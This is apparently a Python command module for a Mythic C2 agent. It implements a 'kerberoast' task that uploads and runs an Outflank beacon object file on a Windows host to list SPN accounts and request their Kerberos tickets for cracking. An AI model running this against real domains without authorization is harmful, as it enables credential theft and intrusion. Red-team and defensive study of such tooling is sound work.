from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
from ..athena_utils.mythicrpc_utilities import *
from ..athena_utils.bof_utilities import *
import json


class KerberoastArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="action",
                type=ParameterType.String,
                description="Action to perform [list, list-no-aes, roast, roast-no-aes]",
                parameter_group_info=[
                    ParameterGroupInfo(
                        ui_position=0,
                        required=True,
                        default_value=""
                        )
                ],
            ),
            CommandParameter(
                name="user",
                type=ParameterType.String,
                description="The user to roast or * for all",
                default_value="*",
                parameter_group_info=[
                    ParameterGroupInfo(
                        ui_position=1,
                        required=True,
                        )
                ],
            )
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == "{":
                self.load_args_from_json_string(self.command_line)
        else:
            raise ValueError("Missing arguments")
    
    async def parse_dictionary(self, dictionary):
        self.load_args_from_dictionary(dictionary)



    

class KerberoastCommand(CoffCommandBase):
    cmd = "kerberoast"
    needs_admin = False
    help_cmd = """
List SPN enabled accounts:
    kerberoast list

List SPN enabled accounts without AES Encryption:
    kerberoast list-no-aes

Roast all SPN enabled accounts:
    kerberoast roast

Roast all SPN enabled accounts without AES Encryption:
    kerberoast roast-no-aes

Roast a specific SPN enabled account:
    kerberoast roast <username>

Credit: The Outflank team for the original BOF - https://github.com/outflanknl/C2-Tool-Collection
    """
    description = "Perform Kerberoasting against all (or specified) SPN enabled accounts."
    version = 1
    script_only = True
    supported_ui_features = ["T1558.003"]
    author = "Cornelis de Plaa (@Cn33liz)"
    argument_class = KerberoastArguments
    attackmapping = []
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Windows],
        builtin=False,
        load_only=True
    )
    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )

        arch = taskData.Callback.Architecture


        if(arch=="x86"):
            raise Exception("BOF's are currently only supported on x64 architectures")

        # Initialize our Argument list object
        OfArgs = []
        
        #Pack our argument and add it to the list
        action = taskData.args.get_arg("action")
        OfArgs.append(generateWString(action))

        user = taskData.args.get_arg("user")

        if user:
            OfArgs.append(generateWString(user))

        #Repeat this for every argument being passed to the COFF (Changing the type as needed)

        # Serialize our arguments into a single buffer and base64 encode it
        encoded_args = base64.b64encode(SerializeArgs(OfArgs)).decode()

        file_id = await compile_and_upload_bof_to_mythic(taskData.Task.ID,"outflank_bofs/kerberoast",f"kerberoast{arch}.o")
        
        # Delegate the execution to the coff command, passing: 
        #   the file_id from our create_file RPC call
        #   the functionName which in this case is go
        #   the number of arguments we packed which in this task is 1
        #   the arguments as a base64 encoded string generated by the OfArgs class
        subtask = await SendMythicRPCTaskCreateSubtask(MythicRPCTaskCreateSubtaskMessage(
            taskData.Task.ID, 
            CommandName="coff",
            SubtaskCallbackFunction="coff_completion_callback",
            Params=json.dumps({
                "coffFile": file_id,
                "functionName": "go",
                "arguments": encoded_args,
                "timeout": "60",
            }),
            Token=taskData.Task.TokenID,
        ))

        # We did it!
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        pass
